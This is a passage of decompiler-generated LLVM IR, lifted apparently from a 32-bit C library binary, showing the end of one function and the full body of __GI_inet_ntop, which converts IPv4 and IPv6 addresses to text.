  %v2_80594c2 = call i32 @__errno_location(i32 %v1_80594c2)
  %v1_80594c7 = inttoptr i32 %v2_80594c2 to i32*
  store i32 28, i32* %v1_80594c7, align 4
  br label %dec_label_pc_80594e0

dec_label_pc_80594d1:                             ; preds = %dec_label_pc_80594a7
  %tmp24 = bitcast i8** %stack_var_-60 to i32*
  %v3_80594d45 = load i32, i32* %tmp24, align 4
  %tmp25 = bitcast i8** %stack_var_-92 to i32*
  store i32 %v3_80594d45, i32* %tmp25, align 4
  %v0_80594d8.cast = inttoptr i32 %v3_80594d45 to i8*
  %v4_80594d8 = call i32 @strcpy(i8* %v0_80594d8.cast, i32 %v2_80594af)
  br label %dec_label_pc_80594e0

dec_label_pc_80594e0:                             ; preds = %dec_label_pc_80594c2, %dec_label_pc_80594d1
  %storemerge = phi i32 [ %v4_80594d8, %dec_label_pc_80594d1 ], [ 0, %dec_label_pc_80594c2 ]
  %v0_80594e7 = phi i32 [ %v4_80594d8, %dec_label_pc_80594d1 ], [ 0, %dec_label_pc_80594c2 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_80593e2, i32* @esi, align 4
  store i32 %v0_80593e1, i32* @edi, align 4
  ret i32 %v0_80594e7

; uselistorder directives
  uselistorder i32 %v0_805949e, { 1, 0 }
  uselistorder i32 %v3_8059494, { 1, 0 }
  uselistorder i32 %v1_8059494, { 1, 0 }
  uselistorder i32 %v1_8059472, { 1, 0 }
  uselistorder i32 %v1_805944e, { 1, 0 }
  uselistorder i32 %v0_8059460, { 1, 0, 2, 3 }
  uselistorder i32 %v1_805942f, { 1, 0 }
  uselistorder i32* %stack_var_-33, { 0, 2, 1 }
  uselistorder i8** %stack_var_-92, { 0, 2, 1 }
  uselistorder i32* %ecx.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 6, 4, 7, 5, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32 42, { 2, 1, 0 }
  uselistorder i16 10, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i8 48, { 0, 1, 9, 10, 2, 3, 4, 5, 8, 7, 6 }
  uselistorder i32 43, { 2, 3, 4, 5, 0, 6, 1 }
  uselistorder i32 100, { 6, 0, 7, 2, 3, 1, 4, 5 }
  uselistorder i32 -65536, { 3, 4, 5, 1, 0, 6, 7, 9, 2, 10, 8, 11 }
  uselistorder label %dec_label_pc_80594e0, { 1, 0 }
  uselistorder label %dec_label_pc_805947c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8059414, { 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_12 = alloca i8*, align 4
  store i8* %arg3, i8** %stack_var_12, align 4
  %stack_var_-94 = alloca i32, align 4
  %stack_var_-124 = alloca i8*, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %v0_80594e9 = load i32, i32* @edi, align 4
  %v0_80594ea = load i32, i32* @esi, align 4
  %v0_80594eb = load i32, i32* @ebx, align 4
  %v15_80594ec = ptrtoint i32* %stack_var_-108 to i32
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v9_80594f3 = icmp eq i32 %arg1, 2
  br i1 %v9_80594f3, label %dec_label_pc_8059503, label %dec_label_pc_80594f8

dec_label_pc_80594f8:                             ; preds = %entry
  %v9_80594f8 = icmp eq i32 %arg1, 10
  %v1_80594fb = icmp eq i1 %v9_80594f8, false
  br i1 %v1_80594fb, label %dec_label_pc_805969f, label %dec_label_pc_805951b

dec_label_pc_8059503:                             ; preds = %entry
  %v4_8059503 = ptrtoint i8* %arg3 to i32
  store i32 %v4_8059503, i32* @edx, align 4
  store i32 %arg4, i32* @ecx, align 4
  store i32 %arg2, i32* @eax, align 4
  %v3_805950f = call i32 @inet_ntop4(i32 %v0_80594eb, i32 %v0_80594ea, i32 %v0_80594e9)
  store i32 %v3_805950f, i32* %eax.global-to-local, align 4
  store i32 %v3_805950f, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80596ac

dec_label_pc_805951b:                             ; preds = %dec_label_pc_80594f8
  store i32 %arg1, i32* %stack_var_-112, align 4
  %v2_8059520 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_8059520, i32* %eax.global-to-local, align 4
  %tmp43 = bitcast i32* %stack_var_-48 to i8*
  store i8* %tmp43, i8** %stack_var_-124, align 4
  %v6_8059525 = call i32 @__GI_memset(i8* %tmp43, i32 0, i32 32)
  store i32 %v6_8059525, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v2_8059547 = add i32 %arg2, 1
  br label %dec_label_pc_8059531

dec_label_pc_8059531:                             ; preds = %dec_label_pc_8059531.dec_label_pc_8059531_crit_edge, %dec_label_pc_805951b
  %v1_8059554 = phi i32 [ %v15_80594ec, %dec_label_pc_805951b ], [ %v1_8059554.pre, %dec_label_pc_8059531.dec_label_pc_8059531_crit_edge ]
  %v0_805954f69 = phi i32 [ 0, %dec_label_pc_805951b ], [ %v0_8059558.pre, %dec_label_pc_8059531.dec_label_pc_8059531_crit_edge ]
  %v1_805953a = ashr i32 %v0_805954f69, 31
  %v2_805953b = zext i32 %v0_805954f69 to i64
  %v4_805953b = zext i32 %v1_805953a to i64
  %v5_805953b = mul nuw i64 %v4_805953b, 4294967296
  %v6_805953b = or i64 %v5_805953b, %v2_805953b
  %v8_805953b = sdiv i64 %v6_805953b, 2
  %v9_805953b = trunc i64 %v8_805953b to i32
  store i32 %v9_805953b, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %edx.global-to-local, align 4
  store i32 %v9_805953b, i32* %ebx.global-to-local, align 4
  %v2_8059543 = add i32 %v0_805954f69, %arg2
  %v3_8059543 = inttoptr i32 %v2_8059543 to i8*
  %v4_8059543 = load i8, i8* %v3_8059543, align 1
  %v5_8059543 = zext i8 %v4_8059543 to i32
  store i32 %v5_8059543, i32* %eax.global-to-local, align 4
  %v3_8059547 = add i32 %v2_8059547, %v0_805954f69
  %v4_8059547 = inttoptr i32 %v3_8059547 to i8*
  %v5_8059547 = load i8, i8* %v4_8059547, align 1
  %v6_8059547 = zext i8 %v5_8059547 to i32
  store i32 %v6_8059547, i32* %edx.global-to-local, align 4
  %v2_805954c = mul nuw nsw i32 %v5_8059543, 256
  %v1_805954f = add i32 %v0_805954f69, 2
  store i32 %v1_805954f, i32* %ecx.global-to-local, align 4
  %v2_8059552 = or i32 %v6_8059547, %v2_805954c
  store i32 %v2_8059552, i32* %eax.global-to-local, align 4
  %v3_8059554 = mul i32 %v9_805953b, 4
  %v4_8059554 = add i32 %v3_8059554, 60
  %v5_8059554 = add i32 %v4_8059554, %v1_8059554
  %v6_8059554 = inttoptr i32 %v5_8059554 to i32*
  store i32 %v2_8059552, i32* %v6_8059554, align 4
  %v0_8059558.pre = load i32, i32* %ecx.global-to-local, align 4
  %v7_805955b = icmp sgt i32 %v0_8059558.pre, 15
  br i1 %v7_805955b, label %dec_label_pc_805955d, label %dec_label_pc_8059531.dec_label_pc_8059531_crit_edge

dec_label_pc_8059531.dec_label_pc_8059531_crit_edge: ; preds = %dec_label_pc_8059531
  %v1_8059554.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8059531

dec_label_pc_805955d:                             ; preds = %dec_label_pc_8059531
  %v4_805951b = ptrtoint i32* %stack_var_-112 to i32
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 -1, i32* @edi, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_8059567.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8059567

dec_label_pc_8059567:                             ; preds = %dec_label_pc_805955d, %dec_label_pc_8059594
  %v0_805959468 = phi i32 [ 0, %dec_label_pc_805955d ], [ %v1_8059594, %dec_label_pc_8059594 ]
  %v0_805957f67 = phi i32 [ -1, %dec_label_pc_805955d ], [ %v0_805957f8, %dec_label_pc_8059594 ]
  %v0_805959f66 = phi i32 [ -1, %dec_label_pc_805955d ], [ %v0_80595849, %dec_label_pc_8059594 ]
  %v0_80595aa65 = phi i32 [ -1, %dec_label_pc_805955d ], [ %v0_805958f13, %dec_label_pc_8059594 ]
  %v2_8059567 = mul nuw nsw i32 %v0_805959468, 4
  %v3_8059567 = add nuw nsw i32 %v2_8059567, 60
  %v4_8059567 = add i32 %v3_8059567, %v0_8059567.pre
  %v5_8059567 = inttoptr i32 %v4_8059567 to i32*
  %v6_8059567 = load i32, i32* %v5_8059567, align 4
  %v7_8059567 = icmp eq i32 %v6_8059567, 0
  %v1_805956c = icmp eq i1 %v7_8059567, false
  %v10_805957f = icmp eq i32 %v0_805957f67, -1
  br i1 %v1_805956c, label %dec_label_pc_805957f, label %dec_label_pc_805956e

dec_label_pc_805956e:                             ; preds = %dec_label_pc_8059567
  %v1_8059571 = icmp eq i1 %v10_805957f, false
  br i1 %v1_8059571, label %dec_label_pc_805957c, label %dec_label_pc_8059573

dec_label_pc_8059573:                             ; preds = %dec_label_pc_805956e
  store i32 %v0_805959468, i32* %eax.global-to-local, align 4
  store i32 1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8059594

dec_label_pc_805957c:                             ; preds = %dec_label_pc_805956e
  %v0_805957c = load i32, i32* %ebx.global-to-local, align 4
  %v1_805957c = add i32 %v0_805957c, 1
  store i32 %v1_805957c, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8059594

dec_label_pc_805957f:                             ; preds = %dec_label_pc_8059567
  br i1 %v10_805957f, label %dec_label_pc_8059594, label %dec_label_pc_8059584

dec_label_pc_8059584:                             ; preds = %dec_label_pc_805957f
  %v10_8059584 = icmp eq i32 %v0_805959f66, -1
  %v0_805958d.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_8059589 = load i32, i32* @ebp, align 4
  %v7_805958b = icmp sgt i32 %v0_805958d.pre, %v1_8059589
  %or.cond = or i1 %v10_8059584, %v7_805958b
  br i1 %or.cond, label %dec_label_pc_805958d, label %dec_label_pc_8059591

dec_label_pc_805958d:                             ; preds = %dec_label_pc_8059584
  store i32 %v0_805958d.pre, i32* @ebp, align 4
  store i32 %v0_80595aa65, i32* @edi, align 4
  br label %dec_label_pc_8059591

dec_label_pc_8059591:                             ; preds = %dec_label_pc_8059584, %dec_label_pc_805958d
  %v0_805958411 = phi i32 [ %v0_80595aa65, %dec_label_pc_805958d ], [ %v0_805959f66, %dec_label_pc_8059584 ]
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8059594

dec_label_pc_8059594:                             ; preds = %dec_label_pc_805957f, %dec_label_pc_805957c, %dec_label_pc_8059573, %dec_label_pc_8059591
  %v0_805958f13 = phi i32 [ %v0_80595aa65, %dec_label_pc_805957f ], [ %v0_80595aa65, %dec_label_pc_805957c ], [ %v0_805959468, %dec_label_pc_8059573 ], [ -1, %dec_label_pc_8059591 ]
  %v0_805957f8 = phi i32 [ -1, %dec_label_pc_805957f ], [ %v0_805957f67, %dec_label_pc_805957c ], [ %v0_805959468, %dec_label_pc_8059573 ], [ -1, %dec_label_pc_8059591 ]
  %v0_80595849 = phi i32 [ %v0_805959f66, %dec_label_pc_805957f ], [ %v0_805959f66, %dec_label_pc_805957c ], [ %v0_805959f66, %dec_label_pc_8059573 ], [ %v0_805958411, %dec_label_pc_8059591 ]
  %v1_8059594 = add nuw nsw i32 %v0_805959468, 1
  store i32 %v1_8059594, i32* %edx.global-to-local, align 4
  %exitcond = icmp eq i32 %v1_8059594, 8
  br i1 %exitcond, label %dec_label_pc_805959a, label %dec_label_pc_8059567

dec_label_pc_805959a:                             ; preds = %dec_label_pc_8059594
  %v10_805959a = icmp eq i32 %v0_805958f13, -1
  br i1 %v10_805959a, label %dec_label_pc_80595ac, label %dec_label_pc_805959f

dec_label_pc_805959f:                             ; preds = %dec_label_pc_805959a
  %v10_805959f = icmp eq i32 %v0_80595849, -1
  %v0_80595a8.pre = load i32, i32* %ebx.global-to-local, align 4
  br i1 %v10_805959f, label %dec_label_pc_80595a8, label %dec_label_pc_80595a4

dec_label_pc_80595a4:                             ; preds = %dec_label_pc_805959f
  %v1_80595a4 = load i32, i32* @ebp, align 4
  %v7_80595a6 = icmp sgt i32 %v0_80595a8.pre, %v1_80595a4
  br i1 %v7_80595a6, label %dec_label_pc_80595a8, label %dec_label_pc_80595ac

dec_label_pc_80595a8:                             ; preds = %dec_label_pc_805959f, %dec_label_pc_80595a4
  store i32 %v0_80595a8.pre, i32* @ebp, align 4
  store i32 %v0_805958f13, i32* @edi, align 4
  br label %dec_label_pc_80595ac

dec_label_pc_80595ac:                             ; preds = %dec_label_pc_80595a4, %dec_label_pc_805959a, %dec_label_pc_80595a8
  %v0_80595ac = phi i32 [ %v0_80595849, %dec_label_pc_80595a4 ], [ %v0_80595849, %dec_label_pc_805959a ], [ %v0_805958f13, %dec_label_pc_80595a8 ]
  %v10_80595ac = icmp eq i32 %v0_80595ac, -1
  br i1 %v10_80595ac, label %dec_label_pc_80595b9, label %dec_label_pc_80595b1

dec_label_pc_80595b1:                             ; preds = %dec_label_pc_80595ac
  %v0_80595b1 = load i32, i32* @ebp, align 4
  %v1_80595b1 = add i32 %v0_80595b1, -1
  %v6_80595b1 = sub i32 0, %v0_80595b1
  %v7_80595b1 = and i32 %v0_80595b1, %v6_80595b1
  %v8_80595b1 = icmp slt i32 %v7_80595b1, 0
  %v9_80595b1 = icmp eq i32 %v1_80595b1, 0
  %v10_80595b1 = icmp slt i32 %v1_80595b1, 0
  %v3_80595b4 = icmp eq i1 %v10_80595b1, %v8_80595b1
  %v4_80595b4 = icmp eq i1 %v9_80595b1, false
  %v5_80595b4 = and i1 %v4_80595b4, %v3_80595b4
  br i1 %v5_80595b4, label %dec_label_pc_80595b9, label %dec_label_pc_80595b6

dec_label_pc_80595b6:                             ; preds = %dec_label_pc_80595b1
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_80595b9

dec_label_pc_80595b9:                             ; preds = %dec_label_pc_80595b1, %dec_label_pc_80595ac, %dec_label_pc_80595b6
  %v0_805965918 = phi i32 [ %v0_80595ac, %dec_label_pc_80595b1 ], [ %v0_80595ac, %dec_label_pc_80595ac ], [ -1, %dec_label_pc_80595b6 ]
  %v2_80595b9 = ptrtoint i32* %stack_var_-94 to i32
  store i32 %v2_80595b9, i32* @ebx, align 4
  %v3_805963b = add i32 %v4_805951b, 64
  %v12_80595f9 = icmp eq i32 %tmp, 65535
  store i32 0, i32* @esi, align 4
  %v10_805965958 = icmp eq i32 %v0_805965918, -1
  %v1_8059601 = icmp eq i1 %v12_80595f9, false
  br label %dec_label_pc_80595c4

dec_label_pc_80595c4:                             ; preds = %dec_label_pc_80595b9, %dec_label_pc_805964f
  %v10_805965964 = phi i1 [ %v10_805965958, %dec_label_pc_80595b9 ], [ %v10_8059659, %dec_label_pc_805964f ]
  %v0_80595de63 = phi i32 [ 0, %dec_label_pc_80595b9 ], [ %v1_805964f, %dec_label_pc_805964f ]
  %v1_80595d462 = phi i32 [ %v0_805965918, %dec_label_pc_80595b9 ], [ %v0_8059659.pre, %dec_label_pc_805964f ]
  %v0_80595e261 = phi i32 [ %v2_80595b9, %dec_label_pc_80595b9 ], [ %v0_80595d819, %dec_label_pc_805964f ]
  %stack_var_-120.160 = phi i8* [ null, %dec_label_pc_80595b9 ], [ %stack_var_-120.0, %dec_label_pc_805964f ]
  %stack_var_-116.159 = phi i32 [ 32, %dec_label_pc_80595b9 ], [ %stack_var_-116.0, %dec_label_pc_805964f ]
  br i1 %v10_805965964, label %dec_label_pc_80595de, label %dec_label_pc_80595c9

dec_label_pc_80595c9:                             ; preds = %dec_label_pc_80595c4
  %v12_80595c9 = icmp eq i32 %v0_80595de63, %v1_80595d462
  %v5_80595cb = icmp slt i32 %v0_80595de63, %v1_80595d462
  br i1 %v5_80595cb, label %dec_label_pc_80595de, label %dec_label_pc_80595cd

dec_label_pc_80595cd:                             ; preds = %dec_label_pc_80595c9
  %v1_80595cd = load i32, i32* @ebp, align 4
  %v2_80595cd = add i32 %v1_80595cd, %v1_80595d462
  store i32 %v2_80595cd, i32* %eax.global-to-local, align 4
  %v5_80595d2 = icmp slt i32 %v0_80595de63, %v2_80595cd
  br i1 %v5_80595d2, label %dec_label_pc_80595d4, label %dec_label_pc_80595de

dec_label_pc_80595d4:                             ; preds = %dec_label_pc_80595cd
  %v1_80595d6 = icmp eq i1 %v12_80595c9, false
  br i1 %v1_80595d6, label %dec_label_pc_805964f, label %dec_label_pc_80595d8

dec_label_pc_80595d8:                             ; preds = %dec_label_pc_80595d4
  %v1_80595d8 = inttoptr i32 %v0_80595e261 to i8*
  store i8 58, i8* %v1_80595d8, align 1
  %v0_80595db = load i32, i32* @ebx, align 4
  %v1_80595db = add i32 %v0_80595db, 1
  store i32 %v1_80595db, i32* @ebx, align 4
  br label %dec_label_pc_805964f

dec_label_pc_80595de:                             ; preds = %dec_label_pc_80595cd, %dec_label_pc_80595c9, %dec_label_pc_80595c4
  %v1_80595de = icmp eq i32 %v0_80595de63, 0
  br i1 %v1_80595de, label %dec_label_pc_80595e6, label %dec_label_pc_80595e2

dec_label_pc_80595e2:                             ; preds = %dec_label_pc_80595de
  %v1_80595e2 = inttoptr i32 %v0_80595e261 to i8*
  store i8 58, i8* %v1_80595e2, align 1
  %v0_80595e5 = load i32, i32* @ebx, align 4
  %v1_80595e5 = add i32 %v0_80595e5, 1
  store i32 %v1_80595e5, i32* @ebx, align 4
  %v0_80595e6.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80595e6

dec_label_pc_80595e6:                             ; preds = %dec_label_pc_80595de, %dec_label_pc_80595e2
  %v0_8059644 = phi i32 [ %v0_80595e261, %dec_label_pc_80595de ], [ %v1_80595e5, %dec_label_pc_80595e2 ]
  %v1_805963b = phi i32 [ 0, %dec_label_pc_80595de ], [ %v0_80595e6.pre, %dec_label_pc_80595e2 ]
  %v9_80595e6 = icmp eq i32 %v1_805963b, 6
  %v1_80595e9 = icmp eq i1 %v9_80595e6, false
  br i1 %v1_80595e9, label %dec_label_pc_805963a, label %dec_label_pc_80595eb

dec_label_pc_80595eb:                             ; preds = %dec_label_pc_80595e6
  %v0_80595eb = load i32, i32* @edi, align 4
  %v1_80595eb = icmp eq i32 %v0_80595eb, 0
  %v1_80595ed = icmp eq i1 %v1_80595eb, false
  br i1 %v1_80595ed, label %dec_label_pc_805963a, label %dec_label_pc_80595ef

dec_label_pc_80595ef:                             ; preds = %dec_label_pc_80595eb
  %v0_80595ef = load i32, i32* @ebp, align 4
  %v9_80595ef = icmp eq i32 %v0_80595ef, 6
  br i1 %v9_80595ef, label %dec_label_pc_8059603, label %dec_label_pc_80595f4

dec_label_pc_80595f4:                             ; preds = %dec_label_pc_80595ef
  %v9_80595f4 = icmp eq i32 %v0_80595ef, 5
  %v1_80595f7 = icmp eq i1 %v9_80595f4, false
  br i1 %v1_80595f7, label %dec_label_pc_805963a, label %dec_label_pc_80595f9

dec_label_pc_80595f9:                             ; preds = %dec_label_pc_80595f4
  br i1 %v1_8059601, label %dec_label_pc_805963a, label %dec_label_pc_8059603

dec_label_pc_8059603:                             ; preds = %dec_label_pc_80595f9, %dec_label_pc_80595ef
  %v2_8059609 = sub i32 %v0_8059644, %v2_80595b9
  store i32 %v2_8059609, i32* @esi, align 4
  %v2_8059614 = sub i32 46, %v2_8059609
  store i32 %v2_8059614, i32* @ecx, align 4
  %v1_8059616 = add i32 %arg2, 12
  store i32 %v1_8059616, i32* @eax, align 4
  store i32 %v0_8059644, i32* @edx, align 4
  %v0_805961b = load i8*, i8** %stack_var_-124, align 4
  %v1_805961b = ptrtoint i8* %v0_805961b to i32
  %v3_805961b = ptrtoint i8* %stack_var_-120.160 to i32
  %v5_805961b = call i32 @inet_ntop4(i32 %v1_805961b, i32 %v3_805961b, i32 %stack_var_-116.159)
  store i32 %v5_805961b, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_8059622 = icmp eq i32 %v5_805961b, 0
  br i1 %v1_8059622, label %dec_label_pc_80596ac, label %dec_label_pc_805962a

dec_label_pc_805962a:                             ; preds = %dec_label_pc_8059603
  %v0_805962d = load i32, i32* @ebx, align 4
  %v5_805962d = inttoptr i32 %v0_805962d to i8*
  store i8* %v5_805962d, i8** %stack_var_-124, align 4
  %v3_805962e = call i32 @strlen(i8* %v5_805962d)
  store i32 %v3_805962e, i32* %eax.global-to-local, align 4
  %v0_8059636 = load i32, i32* @ebx, align 4
  %v3_8059636 = add i32 %v0_8059636, %v3_805962e
  store i32 %v3_8059636, i32* @ebx, align 4
  %v0_805965e.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805965e

dec_label_pc_805963a:                             ; preds = %dec_label_pc_80595f9, %dec_label_pc_80595f4, %dec_label_pc_80595eb, %dec_label_pc_80595e6
  %v0_805963a = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_805963a, i32* %stack_var_-112, align 4
  %v2_805963b = mul i32 %v1_805963b, 4
  %v4_805963b = add i32 %v3_805963b, %v2_805963b
  %v5_805963b = inttoptr i32 %v4_805963b to i32*
  %v6_805963b = load i32, i32* %v5_805963b, align 4
  %v5_8059644 = inttoptr i32 %v0_8059644 to i8*
  store i8* %v5_8059644, i8** %stack_var_-124, align 4
  %v4_8059645 = call i32 @sprintf(i32 %v0_8059644, i32 ptrtoint ([3 x i8]* @global_var_805cd17.349 to i32))
  store i32 %v4_8059645, i32* %eax.global-to-local, align 4
  %v0_805964d = load i32, i32* @ebx, align 4
  %v2_805964d = add i32 %v0_805964d, %v4_8059645
  store i32 %v2_805964d, i32* @ebx, align 4
  br label %dec_label_pc_805964f

dec_label_pc_805964f:                             ; preds = %dec_label_pc_80595d4, %dec_label_pc_80595d8, %dec_label_pc_805963a
  %stack_var_-116.0 = phi i32 [ %v6_805963b, %dec_label_pc_805963a ], [ %stack_var_-116.159, %dec_label_pc_80595d4 ], [ %stack_var_-116.159, %dec_label_pc_80595d8 ]
  %stack_var_-120.0 = phi i8* [ getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805cd17.349, i32 0, i32 0), %dec_label_pc_805963a ], [ %stack_var_-120.160, %dec_label_pc_80595d4 ], [ %stack_var_-120.160, %dec_label_pc_80595d8 ]
  %v0_80595d819 = phi i32 [ %v2_805964d, %dec_label_pc_805963a ], [ %v0_80595e261, %dec_label_pc_80595d4 ], [ %v1_80595db, %dec_label_pc_80595d8 ]
  %v0_805964f = load i32, i32* @esi, align 4
  %v1_805964f = add i32 %v0_805964f, 1
  %v0_8059659.pre = load i32, i32* @edi, align 4
  store i32 %v1_805964f, i32* @esi, align 4
  %v7_8059653 = icmp sgt i32 %v1_805964f, 7
  %v10_8059659 = icmp eq i32 %v0_8059659.pre, -1
  br i1 %v7_8059653, label %dec_label_pc_8059659, label %dec_label_pc_80595c4

dec_label_pc_8059659:                             ; preds = %dec_label_pc_805964f
  br i1 %v10_8059659, label %dec_label_pc_805966a, label %dec_label_pc_805965e

dec_label_pc_805965e:                             ; preds = %dec_label_pc_8059659, %dec_label_pc_805962a
  %v0_8059666 = phi i32 [ %v0_80595d819, %dec_label_pc_8059659 ], [ %v3_8059636, %dec_label_pc_805962a ]
  %v0_805965e = phi i32 [ %v0_8059659.pre, %dec_label_pc_8059659 ], [ %v0_805965e.pre, %dec_label_pc_805962a ]
  %v1_805965e = load i32, i32* @ebp, align 4
  %v2_805965e = add i32 %v1_805965e, %v0_805965e
  store i32 %v2_805965e, i32* %eax.global-to-local, align 4
  %v9_8059661 = icmp eq i32 %v2_805965e, 8
  %v1_8059664 = icmp eq i1 %v9_8059661, false
  br i1 %v1_8059664, label %dec_label_pc_805966a, label %dec_label_pc_8059666

dec_label_pc_8059666:                             ; preds = %dec_label_pc_805965e
  %v1_8059666 = inttoptr i32 %v0_8059666 to i8*
  store i8 58, i8* %v1_8059666, align 1
  %v0_8059669 = load i32, i32* @ebx, align 4
  %v1_8059669 = add i32 %v0_8059669, 1
  store i32 %v1_8059669, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805966a

dec_label_pc_805966a:                             ; preds = %dec_label_pc_805965e, %dec_label_pc_8059659, %dec_label_pc_8059666
  %v0_805966e = phi i32 [ %v0_8059666, %dec_label_pc_805965e ], [ %v0_80595d819, %dec_label_pc_8059659 ], [ %v1_8059669, %dec_label_pc_8059666 ]
  store i32 %v2_80595b9, i32* %edx.global-to-local, align 4
  %v1_805966e = add i32 %v0_805966e, 1
  store i32 %v1_805966e, i32* %eax.global-to-local, align 4
  %v1_8059671 = inttoptr i32 %v0_805966e to i8*
  store i8 0, i8* %v1_8059671, align 1
  %v0_8059674 = load i32, i32* %eax.global-to-local, align 4
  %v1_8059674 = load i32, i32* %edx.global-to-local, align 4
  %v2_8059674 = sub i32 %v0_8059674, %v1_8059674
  store i32 %v2_8059674, i32* @eax, align 4
  %tmp74 = icmp ugt i32 %v2_8059674, %arg4
  br i1 %tmp74, label %dec_label_pc_805967c, label %dec_label_pc_8059689

dec_label_pc_805967c:                             ; preds = %dec_label_pc_805966a
  %v0_805967c = load i8*, i8** %stack_var_-124, align 4
  %v1_805967c = ptrtoint i8* %v0_805967c to i32
  %v2_805967c = call i32 @__errno_location(i32 %v1_805967c)
  store i32 %v2_805967c, i32* %eax.global-to-local, align 4
  %v1_8059681 = inttoptr i32 %v2_805967c to i32*
  store i32 28, i32* %v1_8059681, align 4
  br label %dec_label_pc_80596aa

dec_label_pc_8059689:                             ; preds = %dec_label_pc_805966a
  %v0_8059689 = load i32, i32* @edi, align 4
  store i32 %v0_8059689, i32* %stack_var_-112, align 4
  %tmp45 = bitcast i8** %stack_var_12 to i32*
  %v3_805968c2 = load i32, i32* %tmp45, align 4
  %tmp46 = bitcast i8** %stack_var_-124 to i32*
  store i32 %v3_805968c2, i32* %tmp46, align 4
  %v0_8059693.cast = inttoptr i32 %v3_805968c2 to i8*
  %v5_8059693 = call i32 @strcpy(i8* %v0_8059693.cast, i32 %v2_80595b9)
  store i32 %v5_8059693, i32* %eax.global-to-local, align 4
  store i32 %v5_8059693, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80596ac

dec_label_pc_805969f:                             ; preds = %dec_label_pc_80594f8
  %v1_805969f = call i32 @__errno_location(i32 %v0_80594eb)
  store i32 %v1_805969f, i32* %eax.global-to-local, align 4
  %v1_80596a4 = inttoptr i32 %v1_805969f to i32*
  store i32 97, i32* %v1_80596a4, align 4
  br label %dec_label_pc_80596aa

dec_label_pc_80596aa:                             ; preds = %dec_label_pc_805967c, %dec_label_pc_805969f
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80596ac

dec_label_pc_80596ac:                             ; preds = %dec_label_pc_8059603, %dec_label_pc_8059689, %dec_label_pc_8059503, %dec_label_pc_80596aa
  %v0_80596af = phi i32 [ 0, %dec_label_pc_8059603 ], [ %v5_8059693, %dec_label_pc_8059689 ], [ %v3_805950f, %dec_label_pc_8059503 ], [ 0, %dec_label_pc_80596aa ]
  store i32 %v0_80596af, i32* %eax.global-to-local, align 4
  store i32 %v0_80594eb, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80596af

; uselistorder directives
  uselistorder i32 %v0_80596af, { 1, 0 }
  uselistorder i32 %v0_805966e, { 1, 0 }
  uselistorder i1 %v10_8059659, { 1, 0 }
  uselistorder i32 %v0_8059659.pre, { 1, 0, 2 }
  uselistorder i32 %v1_805964f, { 1, 0, 2 }
  uselistorder i32 %v1_805963b, { 1, 0 }
  uselistorder i32 %v0_8059644, { 3, 2, 0, 1 }
  uselistorder i32 %stack_var_-116.159, { 2, 1, 0 }
  uselistorder i8* %stack_var_-120.160, { 2, 1, 0 }
  uselistorder i32 %v0_80595e261, { 3, 2, 1, 0 }
  uselistorder i32 %v1_80595d462, { 2, 1, 0 }
  uselistorder i32 %v0_80595de63, { 3, 2, 1, 0 }
  uselistorder i32 %v2_80595b9, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_805965918, { 1, 0 }
  uselistorder i32 %v1_80595b1, { 1, 0 }
  uselistorder i32 %v0_80595b1, { 1, 0, 2 }
  uselistorder i32 %v0_80595ac, { 1, 2, 0 }
  uselistorder i32 %v1_8059594, { 0, 2, 1 }
  uselistorder i32 %v0_80595849, { 1, 2, 0, 3 }
  uselistorder i32 %v0_805958f13, { 1, 2, 0, 3 }
  uselistorder i1 %v10_805957f, { 1, 0 }
  uselistorder i32 %v0_80595aa65, { 1, 0, 3, 2 }
  uselistorder i32 %v0_805959f66, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_805959468, { 4, 1, 3, 2, 0 }
  uselistorder i32 %v0_805954f69, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_80594eb, { 0, 2, 1 }
  uselistorder i32* %stack_var_-112, { 0, 1, 3, 2 }
  uselistorder i8** %stack_var_-124, { 0, 4, 3, 2, 5, 1 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 6, 5, 2, 4, 3, 7 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 13, 8, 9, 10, 11, 12, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32 97, { 1, 2, 0 }
